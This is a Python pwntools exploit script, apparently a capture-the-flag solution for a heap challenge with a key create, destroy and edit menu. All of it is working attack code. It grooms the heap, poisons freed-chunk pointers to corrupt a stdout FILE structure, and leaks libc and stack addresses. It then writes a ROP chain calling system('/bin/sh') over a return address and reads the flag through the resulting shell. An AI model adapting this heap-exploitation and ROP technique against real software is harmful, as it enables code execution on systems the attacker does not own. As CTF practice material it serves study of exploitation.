#Author --> @manish
i = 1
from pwn import *

context.log_level = "error"

def create(idx, length, data):
	p.sendlineafter("Action:", "1")
	p.sendlineafter("Key index:", str(idx))
	p.sendlineafter("Key length:", str(length))
	p.sendafter("Details:", data)


def destroy(idx):
	p.sendlineafter("Action:", "2")
	p.sendlineafter("Key index:", str(idx))


def edit(idx, data):
	p.sendlineafter("Action:", "3")
	p.sendlineafter("Key index:", str(idx))
	p.sendafter("Details:", data)

while True:
	print("Try #" + str(i))
	i = i+2

	try:
		p = process("./run")
		#p = remote("pwn.be.ax", 5002)

		create(0, 0x90, "0")
		create(1, 0x90, "1")
		create(2, 0x90, "2")
		create(3, 0x90, "3")
		create(4, 0x90, "4")
		create(5, 0x90, "5")
		create(6, 0x90, "6")
		create(7, 0x90, "7")
		create(8, 0x90, "8")
		create(9, 0x90, "9")
		create(10, 0x90, "10")
		create(11, 0x90, "11")
		create(12, 0x90, "12")
		create(13, 0x90, "13")

		create(14,0x50, "Avoid Consolidation")


		destroy(0)
		destroy(2)
		destroy(4)
		destroy(6)
		destroy(8)
		destroy(10)
		destroy(12)
		destroy(1)
		destroy(3)
		destroy(5)
		destroy(7)
		destroy(9)
		destroy(11)
		destroy(13)

		create(14,0x420, "Pushing into free bins")
		edit(13, "A" * 0x8 + "\x40\x97")

		create(0, 0x90, "0")
		create(1, 0x90, "1")
		create(2, 0x90, "2")
		create(3, 0x90, "3")
		create(4, 0x90, "4")
		create(5, 0x90, "5")
		create(6, 0x90, "6")
		# pause()
		create(7, 0x90, "7")
		create(15, 0x90, "A"*16 + p64(0xfbad1800) + p64(0x0)*3 + "\x00")

		libc_leak = p.recvuntil("Create key")
		libc_leak = u64(libc_leak[10:18])
		libc_base = libc_leak - 0x1f5720
		environ = libc_base + 0x1faec0
		binsh = libc_base + 0x1b4689
		system = libc_base + 0x4e320
		ret = libc_base + 0x2d446
		pop_rdi = libc_base + 0x2daa2

		print("[*] Libc Base : " + hex(libc_base))

		edit(15, "A" * 16 + p64(0xfbad1800)+p64(0x0)*3 + p64(environ) + p64(environ+0x20)*3 + p64(environ+0x21))

		stack_leak = p.recvuntil("Create key")
		stack_leak = u64(stack_leak[1:9])

		print("[*] Stack Leak : " + hex(stack_leak))

		ret_address = stack_leak - 0x278


		create(16, 0x200, "16")
		create(17, 0x200, "17")
		create(18, 0x200, "18")
		create(19, 0x200, "19")
		create(20, 0x200, "20")
		create(21, 0x200, "21")
		create(22, 0x200, "22")
		create(23, 0x200, "23")
		create(24, 0x200, "24")
		create(25, 0x200, "25")
		create(26, 0x200, "26")
		create(27, 0x200, "27")
		create(28, 0x200, "28")
		create(29, 0x200, "29")


		create(30,0x110, "Avoid Consolidation")

		destroy(16)
		destroy(18)
		destroy(20)
		destroy(22)
		destroy(24)
		destroy(26)
		destroy(28)
		destroy(17)
		destroy(19)
		destroy(21)
		destroy(23)
		destroy(25)
		destroy(27)
		destroy(29)

		create(30,0x420, "Pushing into free bins")
		edit(29, "A"*8 + p64(ret_address))

		create(16, 0x200, "16")
		create(17, 0x200, "17")
		create(18, 0x200, "18")
		create(19, 0x200, "19")
		create(20, 0x200, "20")
		create(21, 0x200, "21")
		create(22, 0x200, "22")
		# pause()

		#payload = "A" * (0x118 - 0x30) + p64(pop_rdi) + p64(binsh) + p64(system)
		payload = p64(ret) * (0x118 - 0x30)/8 + p64(ret)*(5+i%2) + p64(pop_rdi) + p64(binsh) + p64(system)
		create(23, 0x200, "23")

		create(30, 0x200, payload)
		p.sendline("cat fla*")
		p.sendline("cat /fla*")

		p.interactive()

	except:
		p.close()